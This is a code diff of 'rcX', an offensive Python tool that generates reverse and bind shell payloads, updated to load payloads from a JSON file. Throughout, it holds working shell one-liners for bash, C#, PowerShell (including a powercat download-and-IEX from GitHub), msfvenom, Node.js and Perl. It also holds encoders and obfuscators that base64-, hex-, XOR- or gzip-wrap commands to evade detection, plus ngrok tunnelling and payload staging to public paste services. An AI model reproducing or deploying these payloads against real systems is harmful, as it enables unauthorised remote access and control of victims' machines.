@@ -1,19 +1,18 @@
 # coding=utf8
 __Author__ = 'FlyfishSec'
-__Version__ = 'v0.0.7'
+__Version__ = 'v0.0.8'
 __SITE__ = 'https://github.com/FlyfishSec/rcX'
 __Description__ = ''''''
 
 __Release_Notes__ = '''
 ✨ New Features
- + Allow custom web html(use `-w custom.html or -w ./www`)
- + Allow custom ngrok authtoken(use `--authtoken <Your ngrok authtoken>`)
+ + Support loading payload from json file 'payloads.json'
 
 🎨 Improvements
- + Code optimization
+ + Optimize imports
  
 🐛 Bug fixes
- + 
+ + Fix packaged binaries output file not working
  
 '''
 
@@ -41,6 +40,25 @@ _______   ____  \\   \\/  /
                      '----'       '----' {0}
 ''']
 
+try:
+    import sys
+    import json
+    import random
+    import re
+    import os
+    import string
+    import base64 as b64
+except KeyboardInterrupt:
+    sys.exit(0)
+except (Exception,) as _:
+    print(_)
+
+
+def get_traceback(e):
+    lines = __import__('traceback').format_exception(type(e), e, e.__traceback__)
+
+    return ''.join(lines)
+
 
 def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell_path="", platform="[]", password="",
               binary_name=None, protocol="tcp", direction="reverse", encryption=None, interactive_mode="Interactive",
@@ -61,19 +79,26 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
 
     conn_info = str(host) + ":" + str(port)
     if localtunnel:
+        loc = localtunnel[6:]
+        name = "ngrok-tcp-" + loc
         public_url = None
-        if "ngrok-tcp" not in [_.name for _ in __import__('threading').enumerate()]:
-            # print([x.name for x in threading.enumerate()])
-            t = ThreadWithReturn(target=tunnel, name="ngrok-tcp", kwargs={"authtoken": authtoken, "protocol": "tcp",
-                                                                          "port": port, "loc": localtunnel[6:]})
-            t.daemon = True
-            t.start()
-            public_url = t.join(timeout=5)
+        # print([x.name for x in __import__('threading').enumerate()])
+        if name not in [_.name for _ in __import__('threading').enumerate()]:
+            try:
+                t = ThreadWithReturn(target=tunnel, name=name, kwargs={"authtoken": authtoken, "protocol": "tcp",
+                                                                       "port": port, "loc": loc})
+                t.daemon = True
+                t.start()
+                public_url = t.join(timeout=5)
+            except KeyboardInterrupt:
+                sys.exit()
         else:
             uri = "http://127.0.0.1:4040/api/tunnels"
             try:
+                time = __import__('time')
+                from pyngrok import ngrok
                 for _ in range(3):
-                    __import__('time').sleep(1)
+                    time.sleep(1)
                     public_url = __import__('requests').get(uri, timeout=3).json()["tunnels"][0]["public_url"]
                     # public_url = ngrok.api_request(uri, method="GET")["tunnels"]["public_url"]
                     if public_url:
@@ -82,7 +107,6 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                 pass
             finally:
                 if not public_url:
-                    from pyngrok import ngrok
                     ngrok.kill()
 
         if public_url:
@@ -98,7 +122,7 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
     dec_ip = host
     if ip_obfuscator:
         regex = r"^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
-        regex = __import__('re').compile(regex)
+        regex = re.compile(regex)
         if regex.match(host):
             dec_ip = Obfuscator().ipObf(host, ip_obfuscator)
 
@@ -120,7 +144,9 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
             if shell_path.lower() == "auto":
                 shell_path = "$BASH"
     else:
-        shell_path = "cmd.exe" if ("windows" in platform and shell_type not in ["bash", "telnet", "openssl"]) or shell_type in ["powershell", "csharp"] else "bash"
+        shell_path = "cmd.exe" if ("windows" in platform and shell_type not in ["bash", "telnet",
+                                                                                "openssl"]) or shell_type in [
+                                      "powershell", "csharp"] else "bash"
 
     if isinstance(encoder, str):
         encoder = encoder.split(",") if "," in encoder else encoder.split(" ")
@@ -128,8 +154,7 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
     # shellcode = False
     # is_code = False
     # is_fuzz = False
-
-    templates = {
+    payloads = {
         "reverse": {
             "bash": {
                 "Bash-i": "{shell_path} -i >& /dev/{protocol}/{host}/{port} 0>&1",
@@ -220,8 +245,6 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                 "powercat-Github-3": '''{binary_name} "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c {host} -p {port} -e {shell_path}"''',
             },
             "csharp": {
-                # src "csharp-csc": '''echo using System;using System.IO;using System.Net;using System.Net.Sockets;using System.Text;using System.Diagnostics;public class i{public static TcpClient c;public static NetworkStream s;public static StreamReader r;public static StreamWriter w;public static StringBuilder u;public static void Main(){c=new TcpClient();u=new StringBuilder();if(!c.Connected){try{c.Connect("host",port);s=c.GetStream();r=new StreamReader(s,System.Text.Encoding.Default);w=new StreamWriter(s,System.Text.Encoding.Default);}catch(Exception){return;}Process h;h=new Process();h.StartInfo.FileName="shell_path";h.StartInfo.UseShellExecute=false;h.StartInfo.RedirectStandardInput=true;h.StartInfo.RedirectStandardOutput=true;h.StartInfo.RedirectStandardError=true;h.OutputDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.ErrorDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.Start();h.BeginOutputReadLine();h.BeginErrorReadLine();while(true){try{u.Append(r.ReadLine());h.StandardInput.WriteLine(u);u.Remove(0,u.Length);}catch(Exception){r.Close();w.Close();h.Kill();break;}}}}public static void SortOutputHandler(object sendingProcess,DataReceivedEventArgs outLine){StringBuilder strOutput=new StringBuilder();if(!String.IsNullOrEmpty(outLine.Data)){try{strOutput.Append(outLine.Data);w.WriteLine(strOutput);w.Flush();}catch(Exception){}}}}>%tmp%\0&&for,/f,%p,in,('where,/r,%systemroot%\Microsoft.NET\Framework,csc.exe'),do,%p /out:%tmp%\0.exe %tmp%\0&&%tmp%\0.exe&&del,/q %tmp%\0.exe''',
-                # src "csharp-powershell": '''$j=get-random;$d=@"\nusing System;using System.IO;using System.Net;using System.Net.Sockets;using System.Text;using System.Diagnostics;public class i$j{public static TcpClient c;public static NetworkStream s;public static StreamReader r;public static StreamWriter w;public static StringBuilder u;public static void Main(){c=new TcpClient();u=new StringBuilder();if(!c.Connected){try{c.Connect("host",port);s=c.GetStream();r=new StreamReader(s,System.Text.Encoding.Default);w=new StreamWriter(s,System.Text.Encoding.Default);}catch(Exception){return;}Process h;h=new Process();h.StartInfo.FileName="shell_path";h.StartInfo.UseShellExecute=false;h.StartInfo.RedirectStandardInput=true;h.StartInfo.RedirectStandardOutput=true;h.StartInfo.RedirectStandardError=true;h.OutputDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.ErrorDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.Start();h.BeginOutputReadLine();h.BeginErrorReadLine();while(true){try{u.Append(r.ReadLine());h.StandardInput.WriteLine(u);u.Remove(0,u.Length);}catch(Exception){r.Close();w.Close();h.Kill();break;}}}}public static void SortOutputHandler(object sendingProcess,DataReceivedEventArgs outLine){StringBuilder strOutput=new StringBuilder();if(!String.IsNullOrEmpty(outLine.Data)){try{strOutput.Append(outLine.Data);w.WriteLine(strOutput);w.Flush();}catch(Exception){}}}}\n"@;Add-Type -TypeDefinition $d -Language CSharp;iex "[i$j]::Main()"'''
                 "csharp-csc": '''echo using System;using System.IO;using System.Net;using System.Net.Sockets;using System.Text;using System.Diagnostics;public class i{{public static TcpClient c;public static NetworkStream s;public static StreamReader r;public static StreamWriter w;public static StringBuilder u;public static void Main(){{c=new TcpClient();u=new StringBuilder();if(!c.Connected){{try{{c.Connect("{host}",{port});s=c.GetStream();r=new StreamReader(s,System.Text.Encoding.Default);w=new StreamWriter(s,System.Text.Encoding.Default);}}catch(Exception){{return;}}Process h;h=new Process();h.StartInfo.FileName="{shell_path}";h.StartInfo.UseShellExecute=false;h.StartInfo.RedirectStandardInput=true;h.StartInfo.RedirectStandardOutput=true;h.StartInfo.RedirectStandardError=true;h.OutputDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.ErrorDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.Start();h.BeginOutputReadLine();h.BeginErrorReadLine();while(true){{try{{u.Append(r.ReadLine());h.StandardInput.WriteLine(u);u.Remove(0,u.Length);}}catch(Exception){{r.Close();w.Close();h.Kill();break;}}}}}}}}public static void SortOutputHandler(object sendingProcess,DataReceivedEventArgs outLine){{StringBuilder strOutput=new StringBuilder();if(!String.IsNullOrEmpty(outLine.Data)){{try{{strOutput.Append(outLine.Data);w.WriteLine(strOutput);w.Flush();}}catch(Exception){{}}}}}}}}>%tmp%\\0&&for,/f,%p,in,('where,/r,%systemroot%\\Microsoft.NET\\Framework,csc.exe'),do,%p /out:%tmp%\\0.exe %tmp%\\0&&%tmp%\\0.exe&&del,/q %tmp%\\0.exe %tmp%\\0''',
                 "csharp-powershell-code": '''$j=get-random;$d=@"\nusing System;using System.IO;using System.Net;using System.Net.Sockets;using System.Text;using System.Diagnostics;public class i$j{{public static TcpClient c;public static NetworkStream s;public static StreamReader r;public static StreamWriter w;public static StringBuilder u;public static void Main(){{c=new TcpClient();u=new StringBuilder();if(!c.Connected){{try{{c.Connect("{host}",{port});s=c.GetStream();r=new StreamReader(s,System.Text.Encoding.Default);w=new StreamWriter(s,System.Text.Encoding.Default);}}catch(Exception){{return;}}Process h;h=new Process();h.StartInfo.FileName="{shell_path}";h.StartInfo.UseShellExecute=false;h.StartInfo.RedirectStandardInput=true;h.StartInfo.RedirectStandardOutput=true;h.StartInfo.RedirectStandardError=true;h.OutputDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.ErrorDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.Start();h.BeginOutputReadLine();h.BeginErrorReadLine();while(true){{try{{u.Append(r.ReadLine());h.StandardInput.WriteLine(u);u.Remove(0,u.Length);}}catch(Exception){{r.Close();w.Close();h.Kill();break;}}}}}}}}public static void SortOutputHandler(object sendingProcess,DataReceivedEventArgs outLine){{StringBuilder strOutput=new StringBuilder();if(!String.IsNullOrEmpty(outLine.Data)){{try{{strOutput.Append(outLine.Data);w.WriteLine(strOutput);w.Flush();}}catch(Exception){{}}}}}}}}\n"@;Add-Type -TypeDefinition $d -Language CSharp;iex "[i$j]::Main()"'''
             },
@@ -271,7 +294,6 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                 "java-jsp2": "https://github.com/ivan-sincek/java-reverse-tcp/blob/main/jsp/reverse/jsp_reverse_shell.jsp",
                 "java-jsp-msfvenom": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={host} LPORT={port} -f raw>reverse.jsp",
                 "java-war-msfvenom": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={host} LPORT={port} -f war>reverse.war"
-                # "rustcat": "rcat {host} {port} -r {shell_path}{rcat_args}",
             },
             "nodejs-linux": {
                 "nodejs-async": """echo 'require("child_process").exec("{shell_path} -i >& /dev/tcp/{host}/{port} 0>&1")'|{binary_name}""",
@@ -313,18 +335,33 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
             "perl-windows": {
                 'perl-bind': '''{binary_name} -e "use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('{protocol}'));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,'>&C');open(STDOUT,'>&C');open(STDERR,'>&C');exec('{shell_path}');}};"''',
             },
-            # gotty args
-            # --url [value] Specify string for the URL
-            # -c user:pass  Credential for Basic Authentication (ex: user:pass, default disabled)
-            # ---all Turn on all features: download /, upload /, api, regeorg, ... (default: false)
-            # -r Add a random string to the URL(default: false)
-            # --api Enable API for executing commands on the system
-            # --regeorg Enable socks4/socks5 proxy using regeorg (default: false)
             "golang": {
                 "gotty-webshell": "gotty {gotty_args}-w --reconnect {shell_path}"
             }
         }
     }
+
+    # Get file execution path
+    if getattr(sys, 'frozen', False):
+        exec_path = os.path.dirname(sys.executable)
+    elif __file__:
+        exec_path = os.path.dirname(__file__)
+
+    payloads_path = os.path.join(exec_path, "payloads.json")
+    if os.path.exists(payloads_path) and not os.path.isdir(payloads_path):
+        # py2 or py3
+        try:
+            json_error = json.decoder.JSONDecodeError
+        except AttributeError:
+            json_error = ValueError
+
+        try:
+            with open(payloads_path) as json_file:
+                payloads = json.load(json_file)
+        except json_error:
+            print("\n'payloads.json' file parsing error! Load built-in payloads.")
+        except Exception as e:
+            print(e)
 
     payloads_dict = {}
     nc_args = ncat_args = pwncat_args = socat_args = gotty_args = ""
@@ -428,8 +465,8 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
             binary_name = shell_type
 
     # format payload
-    if direction in templates and shell_type in templates[direction]:
-        for name, payload in templates[direction][shell_type].items():
+    if direction in payloads and shell_type in payloads[direction]:
+        for name, payload in payloads[direction][shell_type].items():
             if dec_ip and name not in ["ncat", "ncat-c"]:
                 host = dec_ip
             plain_payload = payload.format(shell_path=shell_path, protocol=protocol, host=host, port=port, port2=port2,
@@ -454,7 +491,7 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
             payloads_dict.update(staged_payload_dict)
         else:
             # retry
-            randnum = __import__('random').choice([i for i in range(0, 9) if i != staging_url])
+            randnum = random.choice([i for i in range(0, 9) if i != staging_url])
             staged_payload_dict = wrapper.staging(platform, payloads_dict, shell_path, randnum, staging_cmd)
             if staged_payload_dict is not None:
                 payloads_dict.update(staged_payload_dict)
@@ -477,13 +514,12 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
         if payload:
             payload_size = str(len(payload))
             if output or len(payload) > 8192 and not web:
-                import os
-                directory = "./rcx_results/"
-                filename = name + "-" + str(len(payload)) + "-" + "payload.txt"
-                filepath = os.path.abspath(os.path.join(directory, filename))
+                output_dir = os.path.join(exec_path, "rcx_results")
+                filename = name + "-" + str(len(payload)) + ".txt"
+                filepath = os.path.join(output_dir, filename)
                 try:
-                    if not os.path.isdir(directory):
-                        os.mkdir(directory)
+                    if not os.path.isdir(output_dir):
+                        os.mkdir(output_dir)
                     with open(filepath, "wb") as outfile:
                         outfile.write(payload.encode("utf-8"))
                     if output:
@@ -491,8 +527,7 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                     else:
                         payload = "The payload is too large, has been written to \033[1;37m" + filepath + "\033[0m"
                 except Exception as e:
-                    print("Directory or File can not be created!")
-                    print(get_traceback(e))
+                    print(e)
                     pass
             payloads_size_dict[name + "(size:" + payload_size + ")"] = payload
     payloads_dict = payloads_size_dict
@@ -525,7 +560,7 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
 
 _thread_target_key, _thread_args_key, _thread_kwargs_key = (
     ('_target', '_args', '_kwargs')
-    if __import__('sys').version_info >= (3, 0) else
+    if sys.version_info >= (3, 0) else
     ('_Thread__target', '_Thread__args', '_Thread__kwargs')
 )
 
@@ -615,7 +650,7 @@ def tunnel(authtoken="", protocol=None, port=None, _dir=None, loc=None, url=None
     if authtoken != "":
         token = authtoken
     else:
-        token = __import__('random').choice(ngrok_conf["token"])
+        token = random.choice(ngrok_conf["token"])
     from pyngrok import ngrok, conf
     pyconf = conf.PyngrokConfig(region=loc, auth_token=token, monitor_thread=False)
     try:
@@ -645,7 +680,7 @@ def cmdLineParser():
                         help="The host address to connect to(IP or Domain name).")
     parser.add_argument('-p', '--port', dest='lport', type=int, default='44444', metavar='', help="Port to connect to.")
     parser.add_argument("-t", '--type', default='bash', type=str, metavar='',
-                        choices=['bash', 'netcat', 'powershell', 'openssl', 'cshap', 'perl', 'php',
+                        choices=['bash', 'netcat', 'powershell', 'openssl', 'csharp', 'perl', 'php',
                                  'python', 'ruby', 'socat', 'java', 'nodjs', 'lua', 'golang'],
                         help="Shell type.[bash, netcat, python, php, ...]")
     parser.add_argument("-P", '--platform', type=str.lower, metavar='', default='linux',
@@ -672,36 +707,30 @@ def cmdLineParser():
                         help="Specify the protocol type.[tcp, udp, https]")
     parser.add_argument("--tunnel", metavar='', default='',
                         choices=['ngrok_us', 'ngrok_au', 'ngrok_eu', 'ngrok_ap', 'ngrok_sa', 'ngrok_jp',
-                                 'ngrok_in'],)
+                                 'ngrok_in'], )
     parser.add_argument("--authtoken", type=str, metavar='', default='',
                         help="Use yourself ngrok authtoken.")
     parser.add_argument("--table", default=False, action="store_true",
-                        help="Print payload in tabular format. Default:False")
+                        help="Print payload in tabular format.[Default:False]")
 
     parser.add_argument('-c', '--clip', metavar='', type=int,
                         help="Copy the specified id payload to the clipboard, Example: --clip 1")
     parser.add_argument('-o', '--output', default=False, action='store_true', help="Output to file.")
     parser.add_argument("-v", '--version', action="version", version=__Version__,
-                        help="print the version number and exit.")
+                        help="Print the version number.")
 
     webGroup = parser.add_argument_group('Web Options')
     webGroup.add_argument('-w', '--web', const=1, type=str, metavar='web file path', nargs='?',
-                          help="Enable web mode")
-    webGroup.add_argument('--web-host', default='127.0.0.1', metavar='', help="Web bind address")
-    webGroup.add_argument('--web-port', default='80', type=int, metavar='', help="Web bind port")
-    webGroup.add_argument('--web-debug', default=False, action="store_true", help="Web debug mode")
+                          help="Enable web mode.")
+    webGroup.add_argument('--web-host', default='127.0.0.1', metavar='', help="Web bind address.[Default:127.0.0.1]")
+    webGroup.add_argument('--web-port', default='80', type=int, metavar='', help="Web bind port.[Default:80]")
+    webGroup.add_argument('--web-debug', default=False, action="store_true", help="Web debug mode.[Default:False]")
 
-    if len(__import__('sys').argv) < 2:
+    if len(sys.argv) < 2:
         parser.print_help()
-        __import__('sys').exit(0)
+        sys.exit(0)
 
     return parser.parse_args()
-
-
-def get_traceback(e):
-    lines = __import__('traceback').format_exception(type(e), e, e.__traceback__)
-
-    return ''.join(lines)
 
 
 class PayloadWrapper:
@@ -747,7 +776,6 @@ class PayloadWrapper:
 
         data_dict = staged_payload_dict = {}
         if staging_url in staging_apis.keys():
-            import json
             i = staging_url
             staging_api = staging_apis[i]["api"]
             headers = json.loads(headers.format(staging_apis[i]["url"], staging_apis[i]["url"]))
@@ -809,11 +837,10 @@ class PayloadWrapper:
                     t.start()
                     public_url = t.join(timeout=5)
             except Exception as e:
-                print(get_traceback(e))
+                print(e)
                 pass
 
             try:
-                import os
                 if not os.path.isdir(web_dir):
                     os.mkdir(web_dir)
                 filename = 0
@@ -825,7 +852,7 @@ class PayloadWrapper:
                     staging_url = str(public_url) + '/' + str(filename)
                     staged_payload_dict[name] = self.urlWrapper(staging_cmd, staging_url) + "|" + shell_path
             except Exception as e:
-                print(get_traceback(e))
+                print(e)
                 pass
 
         else:
@@ -907,16 +934,11 @@ class PayloadWrapper:
         for key, data in data_dict.items():
             if method == "put":
                 response = session.put(url, headers=headers, data=data, timeout=15)
-                # print(response.headers)
-                # logging.getLogger("requests.packages.urllib3").propagate = True
-                # logging.info("request was completed in %s seconds [%s]", response.elapsed.total_seconds(),response.url)
             elif method == "post":
                 response = session.post(url, headers=headers, data=data, timeout=15)
             else:
                 response = session.get(url, headers=headers, timeout=15)
-            # logging.info("request was completed in %s seconds [%s]", response.elapsed.total_seconds(), response.url)
             if response.status_code == 200 or 201:
-                # print(response.status_code, response.url, response.text)
                 payload_url = response.text
                 payload_url_dict[key] = payload_url
             else:
@@ -932,14 +954,11 @@ class PayloadWrapper:
         for key, value in payload.items():
             if method == "put":
                 response = session.put(url, headers=headers, data=value, timeout=15)
-                # print(response.headers)
             elif method == "post":
                 response = session.post(url, headers=headers, data=value, timeout=15)
             else:
                 response = session.get(url, headers=headers, timeout=15)
-            # logging.info("request was completed in %s seconds [%s]", response.elapsed.total_seconds(), response.url)
             if response.status_code == 200:
-                # print(response.status_code, response.url, response.text)
                 result = response.url
                 payload_url_dict[key] = result
             else:
@@ -978,41 +997,6 @@ class PayloadWrapper:
             # print(reply)
             return reply.decode()
 
-    @staticmethod
-    def socket2(host=None, port=None, payload=None):
-        import socket
-        host = host
-        port = port
-        if isinstance(payload, dict):
-            staged_payload_dict = {}
-            for key, payload in payload.items():
-                payload = payload.encode()
-                reply = b""
-                sock = socket.create_connection((host, port))
-                sock.sendall(payload)
-                sock.settimeout(1)
-                while True:
-                    try:
-                        reply += sock.recv(4096)
-                    except TimeoutError:
-                        sock.close()
-                        break
-                staged_payload_dict[key] = reply.decode()
-                return reply.decode()
-        else:
-            payload = payload.encode()
-            reply = b""
-            sock = socket.create_connection((host, port))
-            sock.sendall(payload)
-            sock.settimeout(1)
-            while True:
-                try:
-                    reply += sock.recv(4096)
-                except TimeoutError:
-                    sock.close()
-                    break
-            return reply.decode()
-
 
 class Encoder(object):
     def __new__(cls, shell_type=None, platform=None, encoder=None, payload=None, shell_path=None):
@@ -1022,9 +1006,10 @@ class Encoder(object):
         self.encode = encoder
         self.shell_path = shell_path
         self.payload = payload
+
         # Extract code
         if "-c" in encoder and any(x in self.shell_type for x in ["python", "powershell"]):
-            codeRegex = __import__('re').compile(r"([\"'])(?:(?=(\\?))\2.)*?\1")
+            codeRegex = re.compile(r"([\"'])(?:(?=(\\?))\2.)*?\1")
             if codeRegex.search(self.payload):
                 self.payload = codeRegex.search(self.payload).group()[1:-1]
 
@@ -1048,17 +1033,16 @@ class Encoder(object):
         if "-c" in self.encode:
             if "python" in self.shell_type:
                 wrapper = '''python -c "exec(__import__('base64').b64decode('{payload}').decode())"'''
-                payload = wrapper.format(payload=__import__('base64').b64encode(payload.encode()).decode())
+                payload = wrapper.format(payload=b64.b64encode(payload.encode()).decode())
             elif self.shell_type == "powershell":
                 wrapper1 = '''powershell "Invoke-Expression([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{payload}')))"'''
                 wrapper2 = '''powershell "IEX([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{payload}')))"'''
                 wrapper3 = '''powershell "$executioncontext.InvokeCommand.InvokeScript([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{payload}')))"'''
-                wrapper = __import__('random').choice([wrapper1, wrapper2, wrapper3])
-                payload = wrapper.format(payload=__import__('base64').b64encode(payload.encode()).decode())
+                wrapper = random.choice([wrapper1, wrapper2, wrapper3])
+                payload = wrapper.format(payload=b64.b64encode(payload.encode()).decode())
 
         else:
             if "windows" in self.platform:
-                import re
                 ps_regex = re.compile("^powershell\\s*(\\W+|\\W+\\w+)\\s*", re.I)
                 # The raw output of echo without quotes may cause PowerShell to report an error,
                 # use cmd to interpret and execute it
@@ -1070,12 +1054,11 @@ class Encoder(object):
                 if ps_regex.search(payload) and "\"" in payload:
                     payload = re.search(r"([\"'])(?:(?=(\\?))\2.)*?\1", payload).group()[1:-1] + "|" + self.shell_path
 
-                payload = "powershell /e " + __import__('base64').b64encode(payload.encode('UTF-16-LE')).decode()
+                payload = "powershell /e " + b64.b64encode(payload.encode('UTF-16-LE')).decode()
             else:
                 base64Wrapper = "echo {0}|base64 -d|{1}"
-                payload = base64Wrapper.format(
-                    __import__('base64').b64encode(self.payload.encode("utf8")).decode("utf8"),
-                    self.shell_path)
+                payload = base64Wrapper.format(b64.b64encode(self.payload.encode("utf8")).decode("utf8"),
+                                               self.shell_path)
         return payload
 
     def hex(self):
@@ -1084,7 +1067,7 @@ class Encoder(object):
             if "python" in self.shell_type:
                 wrapper1 = '''python -c "exec(bytearray.fromhex('{payload}').decode())"'''
                 wrapper2 = '''python -c "exec(__import__('binascii').unhexlify(bytes('{payload}')).decode())"'''
-                wrapper = __import__('random').choice([wrapper1, wrapper2])
+                wrapper = random.choice([wrapper1, wrapper2])
                 payload = wrapper.format(payload="".join("{:02x}".format(ord(c)) for c in payload))
             elif self.shell_type == "powershell":
                 wrapper = '''powershell "IEX(-join('{payload}'-split'(..)'|?{{$_}}|%{{[char][convert]::ToUInt32($_,16)}}))"'''
@@ -1092,25 +1075,22 @@ class Encoder(object):
 
         else:
             if "windows" in self.platform:
-                import re
                 if re.search("^powershell\\s", payload, re.I):
                     wrapper = '''powershell "-join('{0}'-split'(..)'|?{{$_}}|%{{[char][convert]::ToUInt32($_,16)}})|{1}"'''
                 else:
                     wrapper = '''powershell "-join('{0}'-split'(..)'|?{{$_}}|%{{[char][convert]::ToUInt32($_,16)}})|IEX"'''
                 payload = wrapper.format("".join("{:02x}".format(ord(c)) for c in payload), self.shell_path)
             else:
-                payload = "echo " + "".join(
-                    "{:02x}".format(ord(c)) for c in payload) + "|xxd -r -p|" + self.shell_path
+                payload = "echo " + "".join("{:02x}".format(ord(c)) for c in payload) + "|xxd -r -p|" + self.shell_path
 
         return payload
 
     def xor(self):
-        import random
         payload = self.payload
         if "-c" in self.encode:
             if "python" in self.shell_type:
                 wrapper = '''python -c "exec(''.join([chr(ord(j)^ord('{key}')) for j in bytearray.fromhex('{payload}').decode()]))"'''
-                key = random.choice(__import__('string').ascii_letters + __import__('string').ascii_uppercase)
+                key = random.choice(string.ascii_letters + string.ascii_uppercase)
                 payload = "".join([chr(ord(j) ^ ord(key)) for j in payload])
                 payload = "".join("{:02x}".format(ord(c)) for c in payload)
                 payload = wrapper.format(payload=payload, key=key)
@@ -1155,7 +1135,7 @@ class Encoder(object):
     def bzip2(self):
         payload = self.payload
         if "windows" not in self.platform:
-            payload = __import__('base64').b64encode(__import__('bz2').compress(payload.encode())).decode()
+            payload = b64.b64encode(__import__('bz2').compress(payload.encode())).decode()
             wrapper = "echo {0}|base64 -d|bunzip2 -c|" + self.shell_path
             payload = wrapper.format(payload)
 
@@ -1164,16 +1144,16 @@ class Encoder(object):
     def gzip(self):
         payload = self.payload
         try:
-            payload = __import__('base64').b64encode(__import__('gzip').compress(payload.encode())).decode()
+            payload = b64.b64encode(__import__('gzip').compress(payload.encode())).decode()
         except AttributeError:
-            import zlib
-            z = zlib.compressobj(-1, zlib.DEFLATED, 16+zlib.MAX_WBITS)
+            zlib = __import__('zlib')
+            z = zlib.compressobj(-1, zlib.DEFLATED, 16 + zlib.MAX_WBITS)
             c = z.compress(payload.encode()) + z.flush()
-            payload = __import__('base64').b64encode(c).decode()
+            payload = b64.b64encode(c).decode()
 
         if "windows" in self.platform:
             wrapper = '''powershell /c "sal {var} New-Object;IEx({var} IO.StreamReader(({var} IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String('{payload}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"'''
-            payload = wrapper.format(var=chr(__import__('random').randint(97, 122)), payload=payload)
+            payload = wrapper.format(var=chr(random.randint(97, 122)), payload=payload)
         else:
             wrapper = "echo {0}|base64 -d|gunzip -c|" + self.shell_path
             payload = wrapper.format(payload)
@@ -1186,11 +1166,6 @@ class Encoder(object):
 
 
 class Obfuscator:
-    try:
-        import re
-    except (Exception,) as e:
-        print(e)
-
     binaryRegexStr = r":\w+:"
     requiredWhitespaceRegexStr = r"\^ \^"
     optionalWhitespaceRegexStr = r"\? \?"
@@ -1266,12 +1241,6 @@ class Obfuscator:
         self.stub = '''* *:printf:^ ^%s^ ^'CMD'* *|* *:rev:* *END0* *'''
 
     def obf(self, payload=None, obfuscator=None, platform=None):
-        try:
-            import random
-            import re
-        except (Exception,) as e:
-            print(e)
-
         if obfuscator == "replace_char":
             if "windows" in platform:
                 num = random.randint(16, 999)
@@ -1336,7 +1305,7 @@ class Obfuscator:
                 num_0 = "$#"
 
                 payload = re.sub(r"(?!\s\d)(\s)", whitespace, payload)
-                for c in __import__('string').ascii_lowercase + "123456789/":
+                for c in string.ascii_lowercase + "123456789/":
                     payload = payload.replace(c, "$@" + c)
                 payload = payload.replace("0", num_0)
                 # payload = payload.replace("0", num_0).replace("1", num_1)
@@ -1665,13 +1634,7 @@ class Obfuscator:
 
 
 class RandomGen(object):
-    try:
-        import string
-        import re
-    except (Exception,) as e:
-        print(e)
-
-    randGen = __import__('random').SystemRandom()
+    randGen = random.SystemRandom()
     _generatedVars = set()
     _uniqueRandStrs = set()
     _randStrCharList = [c for c in string.ascii_letters + string.digits + string.punctuation]
@@ -1751,11 +1714,6 @@ class RandomGen(object):
 
     def randGenStr(self, minStrLen=None, maxStrLen=None, charList=None, escapeChars="", noBOBL=True):
         minStrLen, maxStrLen = self._getSizes(minStrLen, maxStrLen)
-        try:
-            import re
-        except (Exception,) as e:
-            print(e)
-
         if charList is None:
             charList = RandomGen._randStrCharList
         randStrLen = RandomGen.randGen.randint(minStrLen, maxStrLen)
@@ -1785,7 +1743,7 @@ class RandomGen(object):
 
 class Utils:
     def __init__(self):
-        if not __import__("sys").stdout.isatty():
+        if not sys.stdout.isatty():
             for _ in dir():
                 if isinstance(_, str) and _[0] != "_":
                     locals()[_] = ""
@@ -1794,10 +1752,6 @@ class Utils:
                 __import__('colorama').init()
 
     def print_banner(self):
-        try:
-            import random
-        except (Exception,) as e:
-            print(e)
         cstr = ['1;32m', '1;33m', '1;35m', '1;36m']
         banner = random.choice(__BANNERS__).format(self.bright_white(__Version__), self.bright_white(__SITE__))
         for i, line in enumerate(banner.splitlines()):
@@ -1806,11 +1760,6 @@ class Utils:
 
     @staticmethod
     def RandomColoring(data=None, web=False):
-        try:
-            import random
-        except (Exception,) as e:
-            print(e)
-
         colors = ["1;32m", "1;33m", "1;35m", "1;36m"]
         webcolors = ["info", "warning", "light", "danger", "success"]
         if isinstance(data, list):
@@ -1825,16 +1774,6 @@ class Utils:
             else:
                 data = "\033[{0}{1}\033[0m".format(random.choice(colors), data)
         return data
-
-    def title(self, data=None):
-        if isinstance(data, list):
-            title = []
-            for _ in data:
-                title.append(self.RandomColoring(_))
-            title = " - ".join(title)
-        else:
-            title = self.RandomColoring(data)
-        return title
 
     def format(self, text=None, title=False, web=False):
         result = ""
@@ -1860,7 +1799,6 @@ class Utils:
                 for key, value in text.items():
                     i += 1
